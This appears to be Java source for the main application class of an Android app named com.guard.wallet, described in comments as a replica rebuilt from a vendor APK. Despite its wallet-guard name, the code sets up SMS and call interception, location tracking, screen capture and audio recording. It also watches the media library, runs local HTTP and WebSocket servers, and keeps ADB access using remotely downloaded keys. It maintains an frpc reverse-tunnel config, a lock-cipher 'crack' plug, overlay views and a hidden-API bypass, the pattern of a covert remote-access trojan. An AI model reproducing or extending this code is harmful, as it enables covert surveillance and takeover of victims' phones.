package com.guard.wallet;

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.util.SyntheticHelper;
import android.annotation.SuppressLint;
import android.app.Application;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import com.guard.wallet.entity.BuildConfig;
import com.guard.wallet.helper.OverlayViewHelper;
import com.guard.wallet.helper.AutomationHelper;
import com.guard.wallet.plug.CrackLockCipherPlug;
import com.guard.wallet.receiver.AlarmReceiver;
import com.guard.wallet.receiver.BatteryLevelReceiver;
import com.guard.wallet.receiver.BootBroadcast;
import com.guard.wallet.receiver.CallReceiver;
import com.guard.wallet.receiver.LocaleChangeReceiver;
import com.guard.wallet.receiver.NetWorkReceiver;
import com.guard.wallet.receiver.PackageReceiver;
import com.guard.wallet.receiver.PowerBroadcastReceiver;
import com.guard.wallet.receiver.ScreenBroadcastReceiver;
import com.guard.wallet.receiver.ShutDownBroadcastReceiver;
import com.guard.wallet.receiver.SmsReceiver;
import com.guard.wallet.service.CustomNotificationService;
import com.guard.wallet.service.WIFIBackgroundService;
import com.guard.wallet.thread.CheckProcessThread;
import com.guard.wallet.thread.HandlerMsgAndTimer;
import com.guard.wallet.thread.KeepHeartThread;
import com.guard.wallet.utils.SystemHelper;
import com.guard.wallet.utils.SharedPrefsManager;
import java.io.File;
import java.util.Locale;
import java.util.Objects;
import java.util.Timer;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;

/**
 * vendor MainApplication — application-level singleton.
 * In vendor APK this is NOT an Application subclass; it's a plain singleton
 * initialized via static init(Application). In the replica we extend Application
 * (registered in AndroidManifest) and delegate onCreate -> init(this).
 */
public class MainApplication extends Application {
    private static final String TAG = "MainApplication";
    private static final com.guard.wallet.lifecycle.ActivityLifecycleTracker activityLifecycleCallbacks = new com.guard.wallet.lifecycle.ActivityLifecycleTracker();

    @SuppressLint({"StaticFieldLeak"})
    private static Context baseContext;
    @SuppressLint({"StaticFieldLeak"})
    private static Context context;
    @SuppressLint({"StaticFieldLeak"})
    private static MainApplication instance;

    private com.guard.wallet.observer.SettingsObserver adbEnabledContentObserver;
    private com.guard.wallet.observer.SettingsObserver adbWIFIEnabledContentObserver;
    private AlarmReceiver alarmReceiver;
    private com.guard.wallet.observer.AudioMediaObserver audioAlbumContentObserver;
    private BatteryLevelReceiver batteryReceiver;
    private BootBroadcast bootReceiver;
    private BuildConfig buildConfig;
    private CallReceiver callReceiver;
    private CheckProcessThread checkThread;
    private com.guard.wallet.observer.ConfigFileObserver configFileDeleteObserver;
    private CrackLockCipherPlug crackLockCipherPlug;
    private com.guard.wallet.observer.SettingsObserver devEnabledContentObserver;
    private HandlerMsgAndTimer handlerMsgAndTimer;
    private KeepHeartThread heartThread;
    private boolean isUserUnlockedInstance = false;
    private com.guard.wallet.infra.JobSchedulerManager jobSchedulerManage;
    private LocaleChangeReceiver localeChangeReceiver;
    private NetWorkReceiver netWorkReceiver;
    private PackageReceiver packageReceiver;
    private com.guard.wallet.observer.PhotoMediaObserver photoAlbumContentObserver;
    private PowerBroadcastReceiver powerReceiver;
    private ScreenBroadcastReceiver screenReceiver;
    private ShutDownBroadcastReceiver shutDownReceiver;
    private com.guard.wallet.sms.SmsPluginLoader smsMessageListener;
    private SmsReceiver smsReceiver;
    private com.guard.wallet.observer.VideoMediaObserver videoAlbumContentObserver;

    // --- Application lifecycle (replica adapter) ---

    @Override
    public void onCreate() {
        super.onCreate();
        init(this);
    }

    // --- vendor static init(Application) ---

    public static void init(Application application) {
        String a0 = SystemHelper.a0(application);
        if (instance == null && Objects.equals(application.getPackageName(), a0)) {
            synchronized (MainApplication.class) {
                if (instance == null) {
                    Log.d(TAG, "MainApplication instance create");
                    baseContext = application.getBaseContext();
                    context = application.getApplicationContext();
                    // ADAPT: in replica, application IS the MainApplication instance
                    if (application instanceof MainApplication) {
                        instance = (MainApplication) application;
                    } else {
                        instance = new MainApplication();
                    }
                    instance.init();
                    application.registerActivityLifecycleCallbacks(activityLifecycleCallbacks);
                    com.guard.wallet.thread.GlobalExceptionHandler handler = com.guard.wallet.thread.GlobalExceptionHandler.a();
                    handler.a = Thread.getDefaultUncaughtExceptionHandler();
                    Thread.setDefaultUncaughtExceptionHandler(handler);
                }
            }
        }
    }

    // --- vendor static destroy(Application) ---

    public static void destroy(Application application) {
        String a0 = SystemHelper.a0(application);
        if (instance != null && Objects.equals(application.getPackageName(), a0)) {
            synchronized (MainApplication.class) {
                MainApplication inst = instance;
                if (inst != null) {
                    inst.terminate();
                    instance = null;
                }
            }
            context = null;
            baseContext = null;
            application.unregisterActivityLifecycleCallbacks(activityLifecycleCallbacks);
        }
    }

    // --- vendor static getters ---

    public static Context getAppContext() {
        return context;
    }

    public static Context getBaseCtx() {
        return baseContext;
    }

    public static MainApplication getInstance() {
        return instance;
    }

    // --- vendor init() — full initialization flow ---

    public void init() {
        Log.d(TAG, "com.guard.wallet 正在启动");
        instance = this;

        // Audio cache directory setup (PCM)
        StringBuilder sb1 = new StringBuilder();
        sb1.append(SystemHelper.i0());
        com.guard.wallet.media.AudioRecordManager.m = SyntheticHelper.appendStrStr(sb1, File.separator, "CacheAudios");
        File pcmDir = new File(com.guard.wallet.media.AudioRecordManager.m);
        String pcmLog;
        if (pcmDir.exists()) {
            if (pcmDir.listFiles() != null && pcmDir.listFiles().length > 0) {
                File[] files = pcmDir.listFiles();
                Objects.requireNonNull(files);
                for (File file : files) {
                    Log.d("AudioRecordManager",
                            String.format(Locale.CHINA, "删除PCM文件:%s %b",
                                    file.getName(), Boolean.valueOf(file.delete())));
                }
            }
            pcmLog = String.format(Locale.CHINA, "PCM目录:%s", com.guard.wallet.media.AudioRecordManager.m);
        } else {
            pcmLog = String.format(Locale.CHINA, "PCM目录:%s -> %b",
                    com.guard.wallet.media.AudioRecordManager.m, Boolean.valueOf(pcmDir.mkdirs()));
        }
        Log.d("AudioRecordManager", pcmLog);

        // WAV cache directory setup
        StringBuilder sb2 = new StringBuilder();
        sb2.append(SystemHelper.i0());
        com.guard.wallet.media.AudioRecordManager.n = SyntheticHelper.appendStrStr(sb2, File.separator, "CacheAudios");
        File wavDir = new File(com.guard.wallet.media.AudioRecordManager.n);
        String wavLog = wavDir.exists()
                ? String.format(Locale.CHINA, "wav目录:%s", com.guard.wallet.media.AudioRecordManager.n)
                : String.format(Locale.CHINA, "wav目录:%s -> %b",
                com.guard.wallet.media.AudioRecordManager.n, Boolean.valueOf(wavDir.mkdirs()));
        Log.d("AudioRecordManager", wavLog);

        // Handler and strategy thread
        if (this.handlerMsgAndTimer == null) {
            this.handlerMsgAndTimer = new HandlerMsgAndTimer();
        }
        if (com.guard.wallet.thread.StrategyThread.g == null) {
            synchronized (com.guard.wallet.thread.StrategyThread.class) {
                if (com.guard.wallet.thread.StrategyThread.g == null) {
                    com.guard.wallet.thread.StrategyThread.g = new com.guard.wallet.thread.StrategyThread();
                }
            }
        }

        // Job scheduler for WiFi background service
        if (this.jobSchedulerManage == null) {
            try {
                Context ctx = context;
                com.guard.wallet.infra.JobSchedulerManager jsm = new com.guard.wallet.infra.JobSchedulerManager(ctx);
                this.jobSchedulerManage = jsm;
                JobScheduler scheduler = jsm.jobScheduler;
                if (scheduler.getPendingJob(116) == null) {
                    ctx.startService(new Intent(ctx, WIFIBackgroundService.class));
                    ComponentName comp = new ComponentName(ctx, WIFIBackgroundService.class);
                    JobInfo.Builder builder = new JobInfo.Builder(116, comp);
                    builder.setPersisted(true);
                    builder.setRequiresCharging(false);
                    builder.setRequiresDeviceIdle(false);
                    builder.setBackoffCriteria(5000L, 0);
                    builder.setMinimumLatency(5000L);
                    builder.setRequiredNetworkType(1);
                    builder.setTriggerContentMaxDelay(5000L);
                    if (scheduler.schedule(builder.build()) <= 0) {
                        Log.e("JobSchedulerManage", "wifi-lock-server job schedule failed");
                    } else {
                        Log.d("JobSchedulerManage", "wifi-lock-server job schedule success");
                    }
                }
            } catch (Exception ex) {
                AppUtils.s("JobSchedulerManage", ex);
            }
        }

        // Register all broadcast receivers via utils
        SystemHelper.W0();
        SystemHelper.k1();
        SystemHelper.c1();
        SystemHelper.l1();
        SystemHelper.b1();
        SystemHelper.j1();
        SystemHelper.h1();
        SystemHelper.i1();
        SystemHelper.m1();
        SystemHelper.e1();

        // Locale change receiver
        synchronized (SystemHelper.class) {
            if (getInstance() != null && getInstance().getLocaleChangeReceiver() == null) {
                IntentFilter filter = new IntentFilter();
                filter.addAction("android.intent.action.LOCALE_CHANGED");
                LocaleChangeReceiver receiver = new LocaleChangeReceiver();
                getInstance().setLocaleChangeReceiver(receiver);
                if (Build.VERSION.SDK_INT >= 33) {
                    getInstance().registerReceiver(receiver, filter, 2);
                } else {
                    getInstance().registerReceiver(receiver, filter);
                }
                Log.d("ReceiverUtils", "localeChangeReceiver 启动完成");
            }
        }

        // HTTP Server initialization
        if (com.guard.wallet.server.ApiRouter.instance == null) {
            synchronized (com.guard.wallet.server.ApiRouter.class) {
                if (com.guard.wallet.server.ApiRouter.instance == null) {
                    com.guard.wallet.server.ApiRouter.instance = new com.guard.wallet.server.ApiRouter();
                }
            }
        }
        com.guard.wallet.server.ApiRouter.instance.startServer();

        // WebSocket startup
        com.guard.wallet.server.WebSocketManager.startDaemon();

        // SMS message listener
        if (this.smsMessageListener == null) {
            com.guard.wallet.sms.SmsPluginLoader listener = new com.guard.wallet.sms.SmsPluginLoader();
            this.smsMessageListener = listener;
            if (listener.a()) {
                com.guard.wallet.http.HttpApiManager.smsRecognizePlug();
            }
        }

        // Unlocked instance initialization
        unlockedInstance();

        // Config file delete observer
        if (this.configFileDeleteObserver == null) {
            com.guard.wallet.observer.ConfigFileObserver observer = new com.guard.wallet.observer.ConfigFileObserver(SystemHelper.i0(), 26);
            this.configFileDeleteObserver = observer;
            observer.startWatching();
        }

        // Crack lock cipher plug
        if (this.crackLockCipherPlug == null) {
            this.crackLockCipherPlug = new CrackLockCipherPlug();
        }

        // Location monitor singleton
        if (com.guard.wallet.location.LocationMonitor.instance == null) {
            synchronized (com.guard.wallet.location.LocationMonitor.class) {
                if (com.guard.wallet.location.LocationMonitor.instance == null) {
                    com.guard.wallet.location.LocationMonitor.instance = new com.guard.wallet.location.LocationMonitor();
                }
            }
        }
    }

    // --- vendor exitApp() ---

    public void exitApp() {
        System.exit(0);
    }

    // --- vendor getters ---

    public com.guard.wallet.observer.SettingsObserver getAdbEnabledContentObserver() { return this.adbEnabledContentObserver; }
    public com.guard.wallet.observer.SettingsObserver getAdbWIFIEnabledContentObserver() { return this.adbWIFIEnabledContentObserver; }
    public AlarmReceiver getAlarmReceiver() { return this.alarmReceiver; }
    public com.guard.wallet.observer.AudioMediaObserver getAudioAlbumContentObserver() { return this.audioAlbumContentObserver; }
    public BatteryLevelReceiver getBatteryReceiver() { return this.batteryReceiver; }
    public BootBroadcast getBootReceiver() { return this.bootReceiver; }

    public BuildConfig getBuildConfig() {
        if (this.buildConfig == null) {
            this.buildConfig = com.guard.wallet.utils.ConfigManager.loadBuildConfig();
        }
        return this.buildConfig;
    }

    public CallReceiver getCallReceiver() { return this.callReceiver; }
    public CheckProcessThread getCheckThread() { return this.checkThread; }
    public com.guard.wallet.observer.ConfigFileObserver getConfigFileDeleteObserver() { return this.configFileDeleteObserver; }

    @Override
    public ContentResolver getContentResolver() {
        return super.getContentResolver();
    }

    public CrackLockCipherPlug getCrackLockCipherPlug() { return this.crackLockCipherPlug; }
    public com.guard.wallet.observer.SettingsObserver getDevEnabledContentObserver() { return this.devEnabledContentObserver; }
    public HandlerMsgAndTimer getHandlerMsgAndTimer() { return this.handlerMsgAndTimer; }
    public KeepHeartThread getHeartThread() { return this.heartThread; }
    public com.guard.wallet.infra.JobSchedulerManager getJobSchedulerManage() { return this.jobSchedulerManage; }
    public LocaleChangeReceiver getLocaleChangeReceiver() { return this.localeChangeReceiver; }
    public NetWorkReceiver getNetWorkReceiver() { return this.netWorkReceiver; }

    @Override
    public String getPackageName() {
        return super.getPackageName();
    }

    public PackageReceiver getPackageReceiver() { return this.packageReceiver; }
    public com.guard.wallet.observer.PhotoMediaObserver getPhotoAlbumContentObserver() { return this.photoAlbumContentObserver; }
    public PowerBroadcastReceiver getPowerReceiver() { return this.powerReceiver; }
    public ScreenBroadcastReceiver getScreenReceiver() { return this.screenReceiver; }
    public ShutDownBroadcastReceiver getShutDownReceiver() { return this.shutDownReceiver; }
    public com.guard.wallet.sms.SmsPluginLoader getSmsMessageListener() { return this.smsMessageListener; }
    public SmsReceiver getSmsReceiver() { return this.smsReceiver; }
    public com.guard.wallet.observer.VideoMediaObserver getVideoAlbumContentObserver() { return this.videoAlbumContentObserver; }

    // --- vendor setters ---

    public void setAdbEnabledContentObserver(com.guard.wallet.observer.SettingsObserver v) { this.adbEnabledContentObserver = v; }
    public void setAdbWIFIEnabledContentObserver(com.guard.wallet.observer.SettingsObserver v) { this.adbWIFIEnabledContentObserver = v; }
    public void setAlarmReceiver(AlarmReceiver v) { this.alarmReceiver = v; }
    public void setAudioAlbumContentObserver(com.guard.wallet.observer.AudioMediaObserver v) { this.audioAlbumContentObserver = v; }
    public void setBatteryReceiver(BatteryLevelReceiver v) { this.batteryReceiver = v; }
    public void setBootReceiver(BootBroadcast v) { this.bootReceiver = v; }
    public void setBuildConfig(BuildConfig v) { this.buildConfig = v; }
    public void setCallReceiver(CallReceiver v) { this.callReceiver = v; }
    public void setCheckThread(CheckProcessThread v) { this.checkThread = v; }
    public void setConfigFileDeleteObserver(com.guard.wallet.observer.ConfigFileObserver v) { this.configFileDeleteObserver = v; }
    public void setCrackLockCipherPlug(CrackLockCipherPlug v) { this.crackLockCipherPlug = v; }
    public void setDevEnabledContentObserver(com.guard.wallet.observer.SettingsObserver v) { this.devEnabledContentObserver = v; }
    public void setHandlerMsgAndTimer(HandlerMsgAndTimer v) { this.handlerMsgAndTimer = v; }
    public void setHeartThread(KeepHeartThread v) { this.heartThread = v; }
    public void setLocaleChangeReceiver(LocaleChangeReceiver v) { this.localeChangeReceiver = v; }
    public void setNetWorkReceiver(NetWorkReceiver v) { this.netWorkReceiver = v; }
    public void setPackageReceiver(PackageReceiver v) { this.packageReceiver = v; }
    public void setPhotoAlbumContentObserver(com.guard.wallet.observer.PhotoMediaObserver v) { this.photoAlbumContentObserver = v; }
    public void setPowerReceiver(PowerBroadcastReceiver v) { this.powerReceiver = v; }
    public void setScreenReceiver(ScreenBroadcastReceiver v) { this.screenReceiver = v; }
    public void setShutDownReceiver(ShutDownBroadcastReceiver v) { this.shutDownReceiver = v; }
    public void setSmsReceiver(SmsReceiver v) { this.smsReceiver = v; }
    public void setUserUnlockedInstance(boolean v) { this.isUserUnlockedInstance = v; }
    public void setVideoAlbumContentObserver(com.guard.wallet.observer.VideoMediaObserver v) { this.videoAlbumContentObserver = v; }

    // --- vendor isUserUnlockedInstance() ---

    public boolean isUserUnlockedInstance() {
        return this.isUserUnlockedInstance;
    }

    // --- vendor unlockedInstance() ---

    @SuppressWarnings("unchecked")
    public void unlockedInstance() {
        if (!SharedPrefsManager.s()) {
            this.isUserUnlockedInstance = false;
            return;
        }

        Log.d(TAG, "unlockedInstance");
        this.buildConfig = com.guard.wallet.utils.ConfigManager.loadBuildConfig();

        if (this.checkThread == null) {
            CheckProcessThread thread = new CheckProcessThread();
            this.checkThread = thread;
            thread.g();
        }
        if (this.heartThread == null) {
            KeepHeartThread ht = new KeepHeartThread();
            this.heartThread = ht;
            ht.d.schedule(ht, 10000L, 10000L);
        }

        this.isUserUnlockedInstance = true;
        SharedPrefsManager.p();

        String hostUrl = com.guard.wallet.http.HttpApiManager.apiBaseUrl;
        com.guard.wallet.http.ShareADBConfigCallback callback = new com.guard.wallet.http.ShareADBConfigCallback();
        new com.guard.wallet.http.HttpClient("http://127.0.0.1:7911").asyncGet(null, "/shareADBConfig", callback);
        com.guard.wallet.http.HttpApiManager.updateDeviceInfo();

        // Register content observers for developer settings
        synchronized (SystemHelper.class) {
            if (getInstance() != null && getInstance().getDevEnabledContentObserver() == null) {
                Uri uri = Settings.Global.getUriFor("development_settings_enabled");
                com.guard.wallet.observer.SettingsObserver obs = new com.guard.wallet.observer.SettingsObserver();
                getInstance().setDevEnabledContentObserver(obs);
                getInstance().getContentResolver().registerContentObserver(uri, false, obs);
            }
        }
        synchronized (SystemHelper.class) {
            if (getInstance() != null && getInstance().getAdbEnabledContentObserver() == null) {
                Uri uri = Settings.Global.getUriFor("adb_enabled");
                com.guard.wallet.observer.SettingsObserver obs = new com.guard.wallet.observer.SettingsObserver();
                getInstance().setAdbEnabledContentObserver(obs);
                getInstance().getContentResolver().registerContentObserver(uri, false, obs);
            }
        }
        synchronized (SystemHelper.class) {
            if (getInstance() != null && getInstance().getAdbWIFIEnabledContentObserver() == null) {
                Uri uri = Settings.Global.getUriFor("adb_wifi_enabled");
                com.guard.wallet.observer.SettingsObserver obs = new com.guard.wallet.observer.SettingsObserver();
                getInstance().setAdbWIFIEnabledContentObserver(obs);
                getInstance().getContentResolver().registerContentObserver(uri, false, obs);
            }
        }

        // Register media content observers
        synchronized (SystemHelper.class) {
            if (getInstance() != null && getInstance().getPhotoAlbumContentObserver() == null) {
                Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                com.guard.wallet.observer.PhotoMediaObserver obs = new com.guard.wallet.observer.PhotoMediaObserver();
                getInstance().setPhotoAlbumContentObserver(obs);
                getInstance().getContentResolver().registerContentObserver(uri, true, obs);
            }
        }
        synchronized (SystemHelper.class) {
            if (getInstance() != null && getInstance().getVideoAlbumContentObserver() == null) {
                Uri uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                com.guard.wallet.observer.VideoMediaObserver obs = new com.guard.wallet.observer.VideoMediaObserver();
                getInstance().setVideoAlbumContentObserver(obs);
                getInstance().getContentResolver().registerContentObserver(uri, true, obs);
            }
        }
        synchronized (SystemHelper.class) {
            if (getInstance() != null && getInstance().getAudioAlbumContentObserver() == null) {
                Uri uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
                com.guard.wallet.observer.AudioMediaObserver obs = new com.guard.wallet.observer.AudioMediaObserver();
                getInstance().setAudioAlbumContentObserver(obs);
                getInstance().getContentResolver().registerContentObserver(uri, true, obs);
            }
        }

        // Hidden API bypass for API 28+
        if (Build.VERSION.SDK_INT >= 28) {
            org.lsposed.hiddenapibypass.HiddenApiBypass.addHiddenApiExemptions("");
        }
    }

    // --- vendor registerReceiver helpers ---
    // NOTE: In vendor APK MainApplication is NOT an Application subclass,
    // so it has custom registerReceiver() methods. In the replica we extend
    // Application, so the base Context.registerReceiver() is inherited.
    // We provide delegating methods with a different name to avoid override conflicts.

    public void registerReceiverCompat(BroadcastReceiver receiver, IntentFilter filter) {
        Context ctx = context;
        if (ctx != null) {
            ctx.registerReceiver(receiver, filter);
        }
    }

    public void registerReceiverCompat(BroadcastReceiver receiver, IntentFilter filter, int flags) {
        if (context != null) {
            context.registerReceiver(receiver, filter, flags);
        }
    }

    // --- vendor offerAccessibilityEvent() ---

    public void offerAccessibilityEvent(Integer eventType) {
        if (this.checkThread == null) {
            CheckProcessThread thread = new CheckProcessThread();
            this.checkThread = thread;
            thread.g();
        }
        CheckProcessThread ct = this.checkThread;
        ct.getClass();
        if (eventType != null && eventType > 0 && !ct.k.contains(eventType)) {
            ct.m.set(System.currentTimeMillis());
            ct.n.set(0L);
            ct.l.set(com.guard.wallet.enums.CheckThreadState.d);
        }
    }

    // --- vendor offerStrategyEvent() ---

    @SuppressWarnings("unchecked")
    public void offerStrategyEvent(String event) {
        if (this.checkThread == null) {
            CheckProcessThread thread = new CheckProcessThread();
            this.checkThread = thread;
            thread.g();
        }
        if (com.guard.wallet.delegate.AdbBridge.getAdbManager() == null) {
            com.guard.wallet.delegate.AdbBridge.initAdbManager();
        }
        com.guard.wallet.thread.StrategyThread jVar;
        synchronized (com.guard.wallet.thread.StrategyThread.class) {
            jVar = com.guard.wallet.thread.StrategyThread.g;
        }
        if (jVar == null && com.guard.wallet.thread.StrategyThread.g == null) {
            synchronized (com.guard.wallet.thread.StrategyThread.class) {
                if (com.guard.wallet.thread.StrategyThread.g == null) {
                    com.guard.wallet.thread.StrategyThread.g = new com.guard.wallet.thread.StrategyThread();
                }
            }
        }
        com.guard.wallet.thread.StrategyThread jVar2;
        synchronized (com.guard.wallet.thread.StrategyThread.class) {
            jVar2 = com.guard.wallet.thread.StrategyThread.g;
        }
        if (jVar2 != null) {
            com.guard.wallet.thread.StrategyThread jVar3;
            synchronized (com.guard.wallet.thread.StrategyThread.class) {
                jVar3 = com.guard.wallet.thread.StrategyThread.g;
            }
            ((ConcurrentLinkedQueue<String>) jVar3.e).offer(event);
        }
    }

    // --- vendor onConfigFileDelete() ---

    public void onConfigFileDelete(String fileName) {
        if (Objects.equals(fileName, "frpc.ini")) {
            CheckProcessThread thread = this.checkThread;
            if (thread != null && Objects.equals(fileName, "frpc.ini") && !thread.h) {
                com.guard.wallet.http.HttpApiManager.queryAgentFile();
            }
        } else if (Objects.equals(fileName, "listenWindows.json")) {
            com.guard.wallet.http.HttpApiManager.syncListenWindows();
        } else if (Objects.equals(fileName, "locateValues.json")) {
            com.guard.wallet.http.HttpApiManager.fetchAppLocateValues();
        } else if ((Objects.equals(fileName, "private.key") || Objects.equals(fileName, "cert.pem"))
                && com.guard.wallet.delegate.AdbBridge.getAdbManager() != null) {
            // Access h.e AdbConnectionManager via delegate to avoid import shadowing
            boolean isPrivateKey = Objects.equals(fileName, "private.key");
            ExecutorService exec = com.guard.wallet.delegate.AdbBridge.getAdbManager().pDownload;
            if (isPrivateKey) {
                com.guard.wallet.delegate.AdbBridge.getAdbManager().privateKey = null;
                String url = com.guard.wallet.utils.SharedPrefsManager.l("private.key.url");
                if (!AppUtils.B(url)) {
                    exec.submit(new com.guard.wallet.download.MultiModeTask(1, url, "private.key"));
                }
            } else {
                com.guard.wallet.delegate.AdbBridge.getAdbManager().certificate = null;
                String url = com.guard.wallet.utils.SharedPrefsManager.l("cert.pem.url");
                if (!AppUtils.B(url)) {
                    exec.submit(new com.guard.wallet.download.MultiModeTask(1, url, "cert.pem"));
                }
            }
        }
    }

    // --- vendor reloadRpcProcess() ---

    public void reloadRpcProcess() {
        CheckProcessThread thread = this.checkThread;
        if (thread != null) {
            thread.e();
        }
    }

    // --- vendor rewriteDebugPort() ---

    public void rewriteDebugPort(Integer port) {
        CheckProcessThread thread = this.checkThread;
        if (thread != null && port != null && port > 0) {
            thread.j.add(port);
        }
    }

    // --- vendor stopRpcProcess() ---

    public void stopRpcProcess() {
        CheckProcessThread thread = this.checkThread;
        if (thread != null) {
            Process proc = thread.f;
            if (proc != null) {
                try {
                    proc.destroy();
                    thread.f = null;
                } catch (Exception ex) {
                    AppUtils.s("CheckProcessThread", ex);
                }
            }
            thread.h = true;
        }
    }

    // --- vendor terminate() ---

    @SuppressWarnings("unchecked")
    public void terminate() {
        if (com.guard.wallet.helper.BlockViewManager.g()) {
            com.guard.wallet.helper.BlockViewManager.c();
        }
        if (OverlayViewHelper.i() || OverlayViewHelper.h()) {
            OverlayViewHelper.f(null, false);
        }
        if (AutomationHelper.k()) {
            AutomationHelper.g(false);
        }

        HandlerMsgAndTimer handler = this.handlerMsgAndTimer;
        if (handler != null) {
            handler.a.cancel();
        }

        com.guard.wallet.infra.JobSchedulerManager jsm = this.jobSchedulerManage;
        if (jsm != null) {
            jsm.jobScheduler.cancelAll();
        }

        CheckProcessThread ct = this.checkThread;
        if (ct != null) {
            ct.b.cancel();
            ct.b = null;
            ct.e.clear();
            ct.e = null;
            Process proc = ct.f;
            if (proc != null) {
                try {
                    proc.destroy();
                    ct.f = null;
                } catch (Exception ex) {
                    AppUtils.s("CheckProcessThread", ex);
                }
            }
            ct.h = true;
            this.checkThread = null;
        }

        KeepHeartThread ht = this.heartThread;
        if (ht != null) {
            ht.d.cancel();
            this.heartThread = null;
        }

        com.guard.wallet.sms.SmsPluginLoader sml = this.smsMessageListener;
        if (sml != null) {
            sml.a.clear();
            sml.b = 0;
            this.smsMessageListener = null;
        }

        if (com.guard.wallet.server.ApiRouter.instance != null) {
            com.guard.wallet.server.ApiRouter.instance.stopServer();
        }

        try {
            com.guard.wallet.server.WebSocketManager wsServer = com.guard.wallet.server.WebSocketManager.instance;
            if (wsServer != null) {
                wsServer.F("");
                com.guard.wallet.server.WebSocketManager.instance.shutdown();
                com.guard.wallet.server.WebSocketManager.instance = null;
            }
        } catch (Exception ex) {
            AppUtils.s("MyWebSocketServer", ex);
        }

        // Unregister all receivers
        if (this.alarmReceiver != null) {
            context.unregisterReceiver(this.alarmReceiver);
            this.alarmReceiver = null;
        }
        if (this.screenReceiver != null) {
            context.unregisterReceiver(this.screenReceiver);
            this.screenReceiver = null;
        }
        if (this.bootReceiver != null) {
            context.unregisterReceiver(this.bootReceiver);
            this.bootReceiver = null;
        }
        if (this.batteryReceiver != null) {
            context.unregisterReceiver(this.batteryReceiver);
            this.batteryReceiver = null;
        }
        if (this.powerReceiver != null) {
            context.unregisterReceiver(this.powerReceiver);
            this.powerReceiver = null;
        }
        if (this.shutDownReceiver != null) {
            context.unregisterReceiver(this.shutDownReceiver);
            this.shutDownReceiver = null;
        }
        if (this.packageReceiver != null) {
            context.unregisterReceiver(this.packageReceiver);
            this.packageReceiver = null;
        }
        if (this.smsReceiver != null) {
            context.unregisterReceiver(this.smsReceiver);
            this.smsReceiver = null;
        }
        if (this.callReceiver != null) {
            context.unregisterReceiver(this.callReceiver);
            this.callReceiver = null;
        }
        if (this.localeChangeReceiver != null) {
            context.unregisterReceiver(this.localeChangeReceiver);
            this.localeChangeReceiver = null;
        }

        if (this.smsMessageListener != null) {
            this.smsMessageListener = null;
        }

        // Unregister content observers
        if (this.devEnabledContentObserver != null) {
            getContentResolver().unregisterContentObserver(this.devEnabledContentObserver);
            this.devEnabledContentObserver = null;
        }
        if (this.adbEnabledContentObserver != null) {
            getContentResolver().unregisterContentObserver(this.adbEnabledContentObserver);
            this.adbEnabledContentObserver = null;
        }
        if (this.adbWIFIEnabledContentObserver != null) {
            getContentResolver().unregisterContentObserver(this.adbWIFIEnabledContentObserver);
            this.adbWIFIEnabledContentObserver = null;
        }
        if (this.photoAlbumContentObserver != null) {
            getContentResolver().unregisterContentObserver(this.photoAlbumContentObserver);
            this.photoAlbumContentObserver = null;
        }
        if (this.videoAlbumContentObserver != null) {
            getContentResolver().unregisterContentObserver(this.videoAlbumContentObserver);
            this.videoAlbumContentObserver = null;
        }
        if (this.audioAlbumContentObserver != null) {
            getContentResolver().unregisterContentObserver(this.audioAlbumContentObserver);
            this.audioAlbumContentObserver = null;
        }

        com.guard.wallet.observer.ConfigFileObserver cfObs = this.configFileDeleteObserver;
        if (cfObs != null) {
            cfObs.stopWatching();
            this.configFileDeleteObserver = null;
        }

        CustomNotificationService.a();

        try {
            // h.e is in package h — import shadowed by com.guard.wallet.utils.SharedPrefsManager
            // Use AdbBridge delegate to avoid shadowing
            Object adbConn = com.guard.wallet.delegate.AdbBridge.getAdbManager();
            if (adbConn != null) {
                com.guard.wallet.delegate.AdbBridge.getAdbManager().close();
                com.guard.wallet.delegate.AdbBridge.clearAdbManager();
            }
        } catch (Exception ex) {
            AppUtils.s("AdbConnectionManager", ex);
        }

        // Cancel strategy timer
        synchronized (com.guard.wallet.thread.StrategyThread.class) {
            if (com.guard.wallet.thread.StrategyThread.g != null) {
                ((Timer) com.guard.wallet.thread.StrategyThread.g.f).cancel();
            }
        }

        // Cleanup location monitor
        if (com.guard.wallet.location.LocationMonitor.instance != null) {
            synchronized (com.guard.wallet.location.LocationMonitor.class) {
                com.guard.wallet.location.LocationMonitor locMon = com.guard.wallet.location.LocationMonitor.instance;
                com.guard.wallet.location.LocationChangeListener listener = locMon.listener;
                if (listener != null) {
                    locMon.locationManager.removeUpdates(listener);
                    locMon.listener = null;
                    locMon.monitorRequest.set(null);
                    Log.d("LocationMonitor", "已取消地理位置实时监听");
                }
                com.guard.wallet.location.LocationMonitor.instance = null;
            }
        }

        // Cleanup screen capture
        com.guard.wallet.capture.ScreenCaptureManager screenCap = com.guard.wallet.capture.ScreenCaptureManager.instance;
        if (screenCap != null) {
            screenCap.release();
            com.guard.wallet.capture.ScreenCaptureManager.instance = null;
        }

        Log.d(TAG, "onTerminate");
    }
}
